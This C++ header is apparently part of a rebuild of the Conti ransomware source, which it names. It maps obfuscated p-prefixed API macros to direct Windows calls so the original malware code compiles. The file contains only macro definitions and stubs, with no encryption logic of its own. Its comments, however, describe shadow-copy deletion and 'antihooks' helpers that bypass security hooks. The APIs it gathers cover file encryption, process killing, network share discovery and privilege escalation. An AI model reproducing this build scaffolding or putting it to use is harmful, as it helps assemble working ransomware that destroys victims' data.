#pragma once
//
// Simplified API resolution for conti_ransomware
// Maps p-prefix function macros to direct Windows API calls
// Preserves call-site syntax from the original code
//

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <Windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <lm.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

// ============================================================
// kernel32 APIs
// ============================================================
#define pCreateFileW            CreateFileW
#define pGetFileSizeEx          GetFileSizeEx
#define pCloseHandle            CloseHandle
#define pGetLogicalDriveStringsW GetLogicalDriveStringsW
#define pInitializeCriticalSection InitializeCriticalSection
#define pEnterCriticalSection   EnterCriticalSection
#define pLeaveCriticalSection   LeaveCriticalSection
#define pDeleteCriticalSection  DeleteCriticalSection
#define pSetFilePointer         SetFilePointer
#define pSetFilePointerEx       SetFilePointerEx
#define pWriteFile              WriteFile
#define pReadFile               ReadFile
#define pGetCommandLineW        GetCommandLineW
#define pWideCharToMultiByte    WideCharToMultiByte
#define pMultiByteToWideChar    MultiByteToWideChar
#define pCreateMutexA           CreateMutexA
#define pWaitForSingleObject    WaitForSingleObject
#define pWaitForMultipleObjects WaitForMultipleObjects
#define pGetNativeSystemInfo    GetNativeSystemInfo
#define pCreateToolhelp32Snapshot CreateToolhelp32Snapshot
#define pProcess32FirstW        Process32FirstW
#define pProcess32NextW         Process32NextW
#define plstrcmpiW              lstrcmpiW
#define plstrcmpiA              lstrcmpiA
#define plstrlenW               lstrlenW
#define plstrlenA               lstrlenA
#define plstrcpyW               lstrcpyW
#define plstrcpyA               lstrcpyA
#define plstrcatW               lstrcatW
#define plstrcatA               lstrcatA
#define plstrcmpW               lstrcmpW
#define plstrcmpA               lstrcmpA
#define pCreateThread           CreateThread
#define pExitThread             ExitThread
#define pSleep                  Sleep
#define pCreateEventW           CreateEventW
#define pSetEvent               SetEvent
#define pResetEvent             ResetEvent
#define pVirtualAlloc           VirtualAlloc
#define pVirtualFree            VirtualFree
#define pVirtualProtect         VirtualProtect
#define pGetModuleHandleW       GetModuleHandleW
#define pFindFirstFileW         FindFirstFileW
#define pFindNextFileW          FindNextFileW
#define pFindClose              FindClose
#define pSetFileAttributesW     SetFileAttributesW
#define pGetFileAttributesW     GetFileAttributesW
#define pDeleteFileW            DeleteFileW
#define pCreateProcessW         CreateProcessW
#define pMoveFileW              MoveFileW
#define pSetEndOfFile           SetEndOfFile
#define pGlobalAlloc            GlobalAlloc
#define pGlobalFree             GlobalFree
#define pHeapAlloc              HeapAlloc
#define pHeapFree               HeapFree
#define pGetProcessHeap         GetProcessHeap
#define pGetCurrentProcessId    GetCurrentProcessId
#define pGetCurrentProcess      GetCurrentProcess
#define pGetModuleFileNameW     GetModuleFileNameW
#define pOpenProcess            OpenProcess
#define pTerminateProcess       TerminateProcess
#define pGetFileSize            GetFileSize
#define pCreateFileMappingW     CreateFileMappingW
#define pMapViewOfFile          MapViewOfFile
#define pUnmapViewOfFile        UnmapViewOfFile
#define pLoadLibraryA           LoadLibraryA
#define pLoadLibraryW           LoadLibraryW
#define pGetProcAddress         GetProcAddress
#define pFreeLibrary            FreeLibrary

// ============================================================
// user32 APIs
// ============================================================
#define pwvsprintfW             wvsprintfW
#define pwvsprintfA             wvsprintfA
#define pwsprintfW              wsprintfW

// ============================================================
// shell32 APIs
// ============================================================
#define pCommandLineToArgvW     CommandLineToArgvW

// ============================================================
// shlwapi APIs
// ============================================================
#define pStrStrIW               StrStrIW
#define pStrStrIA               StrStrIA
#define pPathFindFileNameW      PathFindFileNameW
#define pPathFindExtensionW     PathFindExtensionW
#define pPathCombineW           PathCombineW
#define pPathAppendW            PathAppendW

// ============================================================
// advapi32 APIs (crypto)
// ============================================================
#define pCryptAcquireContextA   CryptAcquireContextA
#define pCryptReleaseContext    CryptReleaseContext
#define pCryptImportKey         CryptImportKey
#define pCryptEncrypt           CryptEncrypt
#define pCryptDecrypt           CryptDecrypt
#define pCryptDestroyKey        CryptDestroyKey
#define pCryptGenRandom         CryptGenRandom
#define pOpenProcessToken       OpenProcessToken
#define pLookupPrivilegeValueW  LookupPrivilegeValueW
#define pAdjustTokenPrivileges  AdjustTokenPrivileges

// ============================================================
// ws2_32 APIs (network)
// ============================================================
#define pWSAStartup             WSAStartup
#define pWSACleanup             WSACleanup
#define psocket                 socket
#define pclosesocket            closesocket
#define pgethostbyname          gethostbyname
#define pgethostname            gethostname
#define pinet_ntoa              inet_ntoa
#define pconnect                connect
#define psend                   send
#define precv                   recv

// ============================================================
// iphlpapi APIs
// ============================================================
#define pGetIpNetTable          GetIpNetTable
#define pGetAdaptersInfo        GetAdaptersInfo

// ============================================================
// netapi32 APIs
// ============================================================
#define pNetShareEnum           NetShareEnum
#define pNetApiBufferFree       NetApiBufferFree

// ============================================================
// ole32 APIs (for WMI/COM - shadow copies deletion)
// ============================================================
#define pCoInitializeEx         CoInitializeEx
#define pCoUninitialize         CoUninitialize
#define pCoCreateInstance        CoCreateInstance
#define pCoInitializeSecurity   CoInitializeSecurity

// ============================================================
// antihooks helper functions (direct API access bypassing hooks)
// Used before the full API system is initialized
// ============================================================
#define apLoadLibraryA          LoadLibraryA
#define apGetProcAddress        GetProcAddress
#define apVirtualProtect        VirtualProtect
#define apGetModuleFileNameW    GetModuleFileNameW
#define apCreateFileMappingW    CreateFileMappingW
#define apMapViewOfFile         MapViewOfFile

// ============================================================
// getapi namespace - API module initialization
// ============================================================
namespace getapi {
    inline BOOL InitializeGetapiModule() { return TRUE; }
    inline VOID SetRestartManagerLoaded(BOOL loaded) { (void)loaded; }
    inline BOOL IsRestartManagerLoaded() { return FALSE; }
}
